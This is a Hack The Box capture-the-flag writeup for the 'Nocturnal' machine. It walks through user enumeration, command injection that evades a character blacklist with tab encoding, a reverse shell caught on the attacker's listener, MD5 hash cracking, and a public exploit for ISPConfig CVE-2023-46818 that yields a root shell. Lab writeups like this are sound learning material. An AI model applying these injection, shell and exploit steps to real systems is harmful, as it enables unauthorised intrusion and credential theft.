---
title: HTB Nocturnal - Writeup
date: 2025-05-20 20:00:00 +0330
categories: [Writeup]
tags: [cve]
description: My writeup of Nocturnal from Hack The Box 

---

![](assets/img/nocturnal.png)

## - **Recon & Enum**
Starting with an Nmap scan.
```shell
$ nmap -sC -sV -oN noc_nmap --min-rate=100 -p- 10.10.11.64
```
```
Nmap scan report for 10.10.11.64
Host is up (0.96s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 20:26:88:70:08:51:ee:de:3a:a6:20:41:87:96:25:17 (RSA)
|   256 4f:80:05:33:a6:d4:22:64:e9:ed:14:e3:12:bc:96:f1 (ECDSA)
|_  256 d9:88:1f:68:43:8e:d4:2a:52:fc:f0:66:d4:b9:ee:6b (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nocturnal.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

In the site, we can upload and view files. While trying to upload a webshell as a pdf file, I noticed the username argument in the url and decided to look for other users using Burp.
![](assets/img/nocturnal_titap.png)
And right off the bat we get `admin` but there was nothing in it.
![](assets/img/nocturnal_intruder.png)
The inturder was really slow so I used gobuster instead.
```shell
$ gobuster fuzz -w /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt -u "http://nocturnal.htb/view.php?username=FUZZ&file=test.pdf" -c "PHPSESSID=dd19n8u36nj5l1va4usr86424v" --exclude-length 2985
```
and we got users `amanda` and `tobias`, amanda had an `.odt` file, checked all files and there was a note in `content.xml` which contained a password `arHkG7HAI68X8s1J`. First I tried SSH but no, so logged in th esite as amanda and there an admin panel.  
## - **Foothold**
Now there was this interesting create backup thingy which took a password as input and zipped the files. Also I tried to see if there is any LFI because of the view file content section, though used it to see how does the zipping function actually work so we can bypass it and inject commands.
![](assets/img/nocturnal_function.png)

so just by inserting a doublequote `"` at the beginning, we can execute commands. As you can see in the admin.php file, some characters including white space are blacklisted. so I used URL encoded tab character `%09` instead, and we got `/etc/passwd`.

![](assets/img/nocturnal_passwd.png)

Because of the character blacklisting, it is a bit hard to directly run a reverse shell, so I'll upload a python reverse shell payload as amanda and execute that to get a shell.

![](assets/img/nocturnal_noc.png)
```
listening on [any] 7070 ...
connect to [*.*.*.*] from (UNKNOWN) [10.10.11.64] 36328
/bin/sh: 0: can't access tty; job control turned off
$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@nocturnal:~/nocturnal.htb$
```
## - **User**
While I was veiwing file contents in admin panel, in the `view.php` I saw a `.db` file, navigated to the directory and opened it with sqlite3.
```
sqlite> select * from users;
select * from users;
1|admin|d725aeba143f575736b07e045d8ceebb
2|amanda|df8b20aa0c935023f99ea58358fb63c4
4|tobias|55c82b1ccd55ab219b3b109b07d5061d
...
```
Using hashcat, I was able to crack `tobias`'s password
```
$ hashcat --show hash.txt -m 0
55c82b1ccd55ab219b3b109b07d5061d:slowmotionapocalypse
```
and we get the user flag.
```
tobias@nocturnal:~$ cat user.txt
b72f452*****************ea70cddd
```
## - **Root**
Our good boy toby can't use sudo, but after checking around I discovered port 8080 is open localy and forwarded back to myself. Scanned it with nmap and it's an http proxy, and when tried going to Nocturnal.htb through the proxy, I found an ISPconfig login page. Tried some default usernames and passwords and the passwords we had found, `admin`:`slowmotionapocalypse` got me in.  
There wasn't much in the panel itself, but after getting the version `3.2.10p1` and looking it up, I discovered a vulnerability `CVE-2023-46818` and I used this [POC](https://github.com/ajdumanhug/CVE-2023-46818).
```
$ python3 exploit.py http://localhost:8080/ admin slowmotionapocalypse
[+] Target URL: http://localhost:8080/
[+] Logging in with username 'admin' and password 'slowmotionapocalypse'
[+] Injecting shell
[+] Launching shell

ispconfig-shell#
```

and from this shell we can the root flag.
```
ispconfig-shell# cat /root/root.txt
a8a9f*****************384dc8aba8
```

![](assets/img/nocturnal_congrats.png)